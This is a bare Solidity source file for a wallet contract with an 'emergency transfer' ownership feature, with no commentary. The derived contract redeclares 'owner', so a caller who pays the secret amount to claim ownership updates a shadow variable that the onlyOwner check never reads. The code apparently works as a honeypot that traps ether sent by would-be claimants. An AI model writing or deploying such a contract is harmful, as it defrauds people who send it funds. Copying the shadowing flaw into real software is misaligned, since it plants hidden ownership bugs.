pragma solidity ^0.4.18;

contract Owned {
    address owner;

    function Owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        if (msg.sender != owner)
            revert();
        _;
    }
}

contract WalletWithEmergencyTransfer is Owned {

    event Deposit(address from, uint amount);
    event Withdrawal(address from, uint amount);
    event Call(address from, address to, uint amount);
    address public owner = msg.sender;
    uint256 private emergencyCode;
    uint256 private emergencyAmount;

    function WalletWithEmergencyTransfer() public {
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        Deposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
        Withdrawal(msg.sender, amount);
    }

    function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
        if (msg.value > 0)
            deposit();

        require(addr.call.value(amount)(data));
        Call(msg.sender, addr, amount);
    }

    function setEmergencySecrets(uint256 code, uint256 amount) public onlyOwner {
        emergencyCode = code;
        emergencyAmount = amount;
    }

    function emergencyTransfer(uint256 code, address newOwner) public payable {
        if ((code == emergencyCode) &&
            (msg.value == emergencyAmount) &&
            (newOwner != address(0))) {
            owner = msg.sender;
        }
    }
}